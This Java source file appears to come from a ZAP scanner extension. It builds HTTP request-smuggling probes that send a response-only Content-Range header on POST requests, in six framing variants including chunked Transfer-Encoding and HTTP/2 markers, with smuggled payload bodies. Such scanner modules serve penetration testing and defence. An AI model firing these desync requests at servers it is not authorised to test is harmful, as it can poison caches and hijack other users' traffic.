package org.zaproxy.zap.extension.hacktor.technique;

import java.util.List;
import java.util.function.BiConsumer;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import org.zaproxy.zap.extension.hacktor.VulnCatalog;

/**
 * The {@code Content-Range} desync class from PortSwigger's
 * <em>http-terminator</em> flamer stage
 * ({@code flamer/import-content-range.json}).
 *
 * <p>{@code Content-Range} is a <em>response</em> header. Sending it on a request
 * is meaningless to a strict parser and ignored, but a server that shares one
 * parser (or one header-length table) between requests and responses may take the
 * range length as the body length instead of {@code Content-Length}. The result
 * is a front end that reads 5 body bytes and an origin that reads 100, or an
 * origin that reads 5 and a second request that starts 5 bytes early.
 *
 * <p>The upstream body types are preserved in the labels:
 * {@code CL.CR} (range used instead of CL), {@code CR.0} (unsatisfied range
 * treated as zero-length) and the {@code H2.CR} / {@code TE.CR} variants where
 * the range rides alongside another framing header.
 */
public class ContentRangeDesyncTechniqueBuilder extends DesyncTechniqueBuilder {

    @Override public String getFamily() { return "Content-Range Desync"; }
    @Override public int getOrder() { return 70; }

    @Override public Technique.Position getPosition() { return Technique.Position.REQUEST; }


    private static final String FAMILY = "Content-Range Desync";

    /** label, body type, Content-Range value, extra headers, body prefix, framing. */
    private static final Object[][] CORPUS = {
        {"CR_0_4_100", "CL.CR", "bytes 0-4/100", null, "XXXXX", Framing.CL},
        {"CR_0_0_100", "CL.CR", "bytes 0-0/100", null, "X", Framing.CL},
        {"CR_unsat", "CR.0", "bytes */0", null, "", Framing.EOF},
        {"CR_0_4_star", "CL.CR", "bytes 0-4/*", null, "XXXXX", Framing.CL},
        {"H2_CR", "H2.CR", "bytes 0-4/100", new String[][]{{"X-Http2", "1"}}, "XXXXX", Framing.CL},
        {"TE_CR", "TE.CR", "bytes 0-4/100", new String[][]{{"Transfer-Encoding", "chunked"}},
            "5\r\nXXXXX\r\n0\r\n\r\n", Framing.CHUNKED},
    };

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      PathContext ctx) {
        final String baseClean = ctx.baseClean;
        for (Object[] row : CORPUS) {
            final String label = (String) row[0];
            final String bodyType = (String) row[1];
            final String range = (String) row[2];
            @SuppressWarnings("unchecked")
            final String[][] extra = (String[][]) row[3];
            final String bodyPrefix = (String) row[4];
            final Framing framing = (Framing) row[5];
            final String body = withSmuggled(bodyPrefix + "$payload", baseClean);

            Technique tech = new Technique(FAMILY, label + ":" + bodyType,
                "Content-Range: " + range + " on a request (response-only header "
                    + "used as a body-length hint)",
                base -> {
                    HttpMessage c = cloneMsg(base);
                    // Extra headers first, then Content-Range, so the wire order
                    // matches the upstream requests (X-Http2: 1 before Content-Range).
                    String[][] headers;
                    if (extra == null) {
                        headers = new String[][]{{"Content-Range", range}};
                    } else {
                        headers = new String[extra.length + 1][];
                        System.arraycopy(extra, 0, headers, 0, extra.length);
                        headers[extra.length] = new String[]{"Content-Range", range};
                    }
                    applyRaw(c, "POST", headers, body, framing);
                    return c;
                });
            tech.setTier(bodyType.equals("CL.CR") ? VulnCatalog.Tier.CLASSIC : VulnCatalog.Tier.RARE);
            tech.setDiscardOn(400, 404, 416);
            tech.setDiscardEmptyBody(true);
            markRawAdd(techs, tech);
        }
    }
}
